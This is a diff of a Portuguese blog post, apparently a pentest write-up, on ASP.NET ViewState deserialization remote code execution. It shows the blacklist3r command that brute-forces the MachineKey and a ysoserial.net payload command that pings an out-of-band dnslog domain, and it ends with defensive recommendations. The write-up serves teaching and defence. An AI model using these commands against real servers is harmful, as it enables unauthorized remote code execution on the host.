@@ -42,7 +42,7 @@ author_nickname: A$PX
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ```
 
-# Sumário
+##  Sumário
 
 1. O que é o VIEWSTATE?
 2. Introdução.
@@ -51,24 +51,25 @@ author_nickname: A$PX
 5. PoC Exploit.
 6. Recomendações.
 7. Conclusão.
-# 1) O que é o VIEWSTATE?
+
+### O que é o VIEWSTATE?
 
 O ViewState é um mecanismo incorporado na plataforma ASP.NET para persistir elementos da interface do utilizador e outros dados em pedidos sucessivos. Os dados a serem mantidos são serializados pelo servidor e transmitidos através de um campo de formulário oculto. Quando são lançados de volta ao servidor, o parâmetro ViewState é desserializado e os dados são recuperados.
 
-# 2) Introdução!
+### Introdução!
 
 Estava realizando um pentest em um ambiente real (permitido) para o meu amigo, e acabei me deparando com um servidor web onde utilizava o Framework 'Microsoft ASP.NET'. Neste momento, ao analisar o código-fonte usando o view-source do navegador, percebi que havia os '__VIEWSTATES' e '__VIEWSTATEGENERATOR'. Porém, o que chamou a minha atenção foi que ao atualizar a página eles não se alteravam.
 
-<img src="/assets/img/Pasted image 20230802113354.png">
-<img src="/assets/img/Pasted image 20230802113553.png">
+<img src="/assets/img/viewstate-deser/Pasted image 20230802113354.png">
+<img src="/assets/img/viewstate-deser/Pasted image 20230802113553.png">
 
 Após isso, utilizei a extensão 'ViewStateDecoder'[1], que pode ser utilizada no BurpSuite. Após a instalação da extensão, obtive o valor do ViewState que estava no website e fiz uma decodificação, percebendo que conseguimos decodificar e que o MAC não está habilitado. Isso dificultaria o processo.
 
-<img src="/assets/img/Pasted image 20230802185338.png">
+<img src="/assets/img/viewstate-deser/Pasted image 20230802185338.png">
 
 Um dos fatos interessantes deve-se ao fato de que esse ViewState pode ser controlado por qualquer pessoa para desserializar as informações sensíveis nela contidas, ou mesmo passar um ViewState malicioso para o processo de desserialização (isso será demonstrado mais tarde).
 
-# 3) Obtendo a MachineKeys!!!
+### Obtendo a MachineKeys!!!
 
 Vamos utilizar o blacklist3r, que pode ser encontrado nos exemplos do "badsecrets"[2]. Para realizar o BruteForce no ViewState e conseguir a MachineKeys validationkey e descobrir o tipo de validationAlgo, vamos utilizar o comando abaixo. Note que inserimos o ViewState e o ViewStateGenerator que foram obtidos do view-source do website.
 
@@ -78,11 +79,11 @@ python3 blacklist3r.py --viewstate /wEPDwUJOTE2MDg4OTExZGQldI9l1U1eHRoGgWNNqx8PZ
 
 Após montarmos o comando a ser utilizado, nós vamos executá-lo... e conseguimos com sucesso a validationkey e o validationAlgo!!! =)
 
-<img src="/assets/img/Pasted image 20230802110656.png">
+<img src="/assets/img/viewstate-deser/Pasted image 20230802110656.png">
 
 Obtivemos a validationkey com sucesso e também percebemos que o algoritmo de criptografia é SHA1. Essas informações que obtivemos agora serão muito úteis quando formos preparar o nosso payload!!!
 
-# 4) Preparando o Payload!!!
+### Preparando o Payload!!!
 
 Agora vamos utilizar o ysoserial.net[3] para gerar um payload serializado. Note que no primeiro parâmetro definimos o tipo de plugin que será usado para o ViewState, em seguida, o tipo de gadget chain e, posteriormente, o comando a ser executado na máquina. Na sequência, incluímos o valor que estava no __ViewStateGenerator, o tipo de algoritmo do validationAlgo e, por fim, a nossa validationKey do MachineKeys.
 
@@ -96,25 +97,27 @@ ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "ping qlsqqg.dnslog.cn" --g
 
 Agora vamos executar o nosso comando...
 
-<img src="/assets/img/Pasted image 20230802114402.png">
+<img src="/assets/img/viewstate-deser/Pasted image 20230802114402.png">
 
 Pronto! Após executar o nosso comando, já pronto, conseguimos o nosso payload serializado para ser utilizado... vamos para a melhor parte!!! =D
-# 5) PoC Exploit
+
+### PoC Exploit
 
 Chegamos na melhor parte... Neste momento, fui em um campo de busca do website localizado na "Home.aspx" e abri o Burp Suite, interceptando o request POST. Alterei o __VIEWSTATE original e coloquei o nosso, que foi gerado no ysoserial.net.
 
 Observação: poderíamos ter simplesmente colocado um **`/Home.aspx?__VIEWSTATES=PAYLOAD-YSOSERIAL`** na URL do website, mas optamos por fazer de um jeito mais "PROFISSIONAL" e evitar algum possível problema que poderia surgir pela falta de outros parâmetros e seus valores.
 
-<img src="/assets/img/Pasted image 20230802222944.png">
+<img src="/assets/img/viewstate-deser/Pasted image 20230802222944.png">
 
 Agora vamos no DNSLOG onde o nosso subdomínio foi gerado, mas lembre-se de que no nosso payload o comando a ser executado é um PING no nosso domínio do dnslog... Agora vamos enviar o request!!!
 
-<img src="/assets/img/Pasted image 20230802114816.png">
+<img src="/assets/img/viewstate-deser/Pasted image 20230802114816.png">
 
 Observamos que conseguimos executar o comando na máquina que hospeda o webserver, assim conseguindo validar o nosso RCE. O tipo de técnica a ser usada para explorar esse tipo de RCE é o **Out of Band Exploitation (OOB)**.
 
 A técnica Out-Of-Band (OOB) [6] fornece a um atacante uma forma alternativa de confirmar e explorar uma vulnerabilidade que, de outra forma, é "cega". Em uma vulnerabilidade cega, o atacante não obtém o resultado da vulnerabilidade na resposta direta do website vulnerável. As técnicas OOB frequentemente requerem que o servidor vulnerável gere um pedido TCP/UDP/ICMP de saída, o que permitirá ao atacante exfiltrar dados.
-# 6) Recomendações
+
+### Recomendações
 
 A lista seguinte mostra como defender os riscos deste ataque:
 
@@ -124,7 +127,7 @@ A lista seguinte mostra como defender os riscos deste ataque:
 - Todas as chaves de validação ou de desencriptação divulgadas têm de ser geradas de novo.
 -  Certifique-se de que as páginas de erro personalizadas estão a ser utilizadas e que os utilizadores não podem ver as mensagens de erros reais causando um path disclosure.
 
-# 7) Conclusão
+### Conclusão
 
 Vimos como o ViewState pode ser explorado e uma breve explicação sobre a técnica de exploração **Out of Band Exploitation (OOB)**. Deixarei abaixo alguns conteúdos sobre a exploração em ViewStates [7]-[8]-[9]. Bom, estamos no fim deste paper, espero que tenham gostado realmente. Se tiverem qualquer dúvida, estou disposto a ajudar; basta entrar em contato comigo.
 
